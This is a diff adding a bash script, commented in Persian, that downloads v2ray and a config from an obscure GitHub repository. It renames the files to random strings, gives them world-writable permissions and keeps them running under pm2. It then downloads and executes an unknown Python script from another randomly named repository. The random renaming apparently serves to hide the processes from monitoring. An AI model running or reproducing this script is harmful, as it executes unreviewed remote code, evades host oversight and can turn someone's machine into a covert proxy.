@@ -1,1 +1,35 @@
+#!/bin/bash
 
+# تابع ساخت اسم رندوم
+random_name() {
+    tr -dc A-Za-z0-9 </dev/urandom | head -c 10
+}
+
+# اجرای اصلیd
+# دانلود v2ray
+wget https://github.com/v2fly/v2ray-core/releases/download/v5.13.0/v2ray-linux-64.zip
+unzip v2ray-linux-64.zip
+
+# تغییر نام فایل v2ray به رندوم
+NEW_V2=$(random_name)
+mv v2ray $NEW_V2
+
+# دانلود کانفیگ
+wget https://raw.githubusercontent.com/mirjinx83/probable-invention/main/fx.json
+
+# ساخت اسکریپت bash.sh و تغییر نامش
+echo "./$NEW_V2 run --config=fx.json" > bash.sh
+NEW_SH=$(random_name).sh
+mv bash.sh $NEW_SH
+chmod 777 $NEW_SH
+
+# نصب pm2 و اجرای اسکریپت
+npm install -g pm2
+pm2 start $NEW_SH
+
+# دانلود و تغییر نام اسکریپت پایتون
+wget https://raw.githubusercontent.com/im7xeig/scaling-waffle/main/run.py
+NEW_PY=$(random_name).py
+mv run.py $NEW_PY
+chmod 777 $NEW_PY
+./$NEW_PY
